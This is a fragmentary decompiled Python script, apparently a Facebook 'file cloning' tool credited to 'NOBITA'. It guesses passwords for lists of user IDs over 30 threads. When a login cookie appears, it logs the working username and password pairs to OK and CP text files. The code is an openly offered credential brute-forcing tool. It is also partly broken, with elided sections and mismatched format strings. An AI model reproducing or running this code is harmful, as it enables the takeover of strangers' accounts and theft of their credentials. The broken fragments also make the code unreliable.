# Decompile by Mardis (𝐓𝐎𝐎𝐋𝐒 𝐁𝐘 𝐍𝐎𝐁𝐈𝐓𝐀)
...
d8b   db  .d88b.  d8888b. d888888b d888888b  .d8b.  
888o  88 .8P  Y8. 88  `8D   `88'   `~~88~~' d8' `8b 
88V8o 88 88    88 88oooY'    88       88    88ooo88 
88 V8o88 88    88 88~~~b.    88       88    88~~~88 
88  V888 `8b  d8' 88   8D   .88.      88    88   88 
VP   V8P  `Y88P'  Y8888P' Y888888P    YP    YP   YP 
                                                                                                     
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : ☣️>𝐍𝐎𝐁𝐈𝐓𝐀<☣️
 
\033[0;93mFACEBOOK : ☣️>𝐍𝐎𝐁𝐈𝐓𝐀𝟐𝟐𝟔𝟎<☣️ 
 
\033[0;96mGITHUB   :  ☣️>𝐍𝐎𝐁𝐈𝐓𝐀𝟐𝟐𝟔𝟎<☣️  
 
\033[0;95mTOOLS    : 𝐃𝐔𝐌𝐏 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆/𝐃𝐔𝐌𝐏
\033[0;96m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92m𝐍𝐎𝐁𝐈𝐓𝐀  _OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91m𝐍𝐎𝐁𝐈𝐓𝐀_CP.txt' % (H, P, str(len(cp))))
...
def sarfraz():
    ...
    IP = ipm['origin']
    print
    print(' [1] 𝐒𝐓𝐀𝐑𝐓 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆✅')
    print(' [2] ❌𝐃𝐔𝐌𝐏-𝐌𝐀𝐊𝐄 𝐅𝐈𝐋𝐄❌')
    print(' [3] 𝔼𝕏𝕀𝕋 ')
    print('')
    _sarfraz___ = input(' [?] 𝐂𝐇𝐎𝐎𝐒𝐄 𝐎𝐏𝐓𝐈𝐎𝐍 : ')
...
class __xxx__:
    ...
    def sarfrazx(self,id):
        ...
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            ...
            print(' [!] 𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐑𝐑𝐄𝐂𝐓 𝐎𝐍𝐄');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[𝐍𝐎𝐁𝐈𝐓𝐀  ] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[𝐍𝐎𝐁𝐈𝐓𝐀  -OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('𝐍𝐎𝐁𝐈𝐓𝐀  _OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[𝐍𝐎𝐁𝐈𝐓𝐀-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('𝐍𝐎𝐁𝐈𝐓𝐀_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # 𝐍𝐎𝐁𝐈𝐓𝐀  Bangladesh Hacker
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
